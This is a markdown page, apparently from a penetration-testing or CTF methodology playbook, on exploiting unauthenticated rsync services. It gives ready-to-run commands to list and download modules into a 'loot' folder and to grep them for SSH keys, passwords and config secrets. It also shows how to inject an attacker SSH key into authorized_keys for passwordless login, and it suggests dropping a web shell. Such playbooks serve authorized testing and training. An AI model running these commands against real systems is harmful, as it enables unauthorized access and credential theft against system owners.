---
id: rsync-enum
title: Rsync Enumeration
stage: enumeration
tags: [linux]
summary: List and download Rsync modules without authentication — home directories exposed here mean SSH key injection is minutes away.
leads_to:
  - ssh-access
  - rev-shell
---

## Prerequisites

Port 873 TCP open. No credentials required when modules allow unauthenticated access (the default for many setups).

Rsync is a file sync tool that exposes "modules" — named directory shares. Unauthenticated access to a home directory module is effectively game over: you can read SSH keys or write your own public key into `authorized_keys` and SSH in directly. Even read-only access to `/etc` or `/var/www` routinely yields credentials and configs.

## Quick Win

> List available modules — see what's exposed before downloading anything.

```bash
rsync --list-only rsync://$TARGET/
```

## Nmap Alternative

> Module list via nmap script.

```bash
nmap -p873 --script rsync-list-modules $TARGET
```

## Download a Module

> Pull the entire module content locally — search it for credentials after.

```bash
rsync -av rsync://$TARGET/<module>/ ./loot/
rsync -av --no-motd rsync://$TARGET/<module>/ ./loot/   # suppress banner
```

## Authenticated Access

> If a module requires authentication — try weak or default credentials.

```bash
rsync -av rsync://user@$TARGET/<module>/ ./loot/
```

## Hunt Downloaded Content

> Targeted search for high-value files after download.

```bash
find ./loot -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
find ./loot -name "*.conf" -o -name ".env" -o -name "wp-config.php" 2>/dev/null
grep -r "password\|passwd\|secret\|key" ./loot/ --include="*.conf" 2>/dev/null
```

## Upload SSH Key (if write access)

> Push your public key into a writable home directory — SSH in without a password.

```bash
ssh-keygen -t rsa -f /tmp/evil_rsa -N ''
rsync -av /tmp/evil_rsa.pub rsync://$TARGET/<module>/.ssh/authorized_keys
ssh -i /tmp/evil_rsa user@$TARGET
```

## Leads To

Home directory exposed with write access → SSH key injection → ssh-access immediately. Config files with credentials → password-spray or direct auth on other services. Web root exposed with write access → drop a web shell → rev-shell. Module names to try: `home`, `backup`, `www`, `var`, `etc`, `data`.
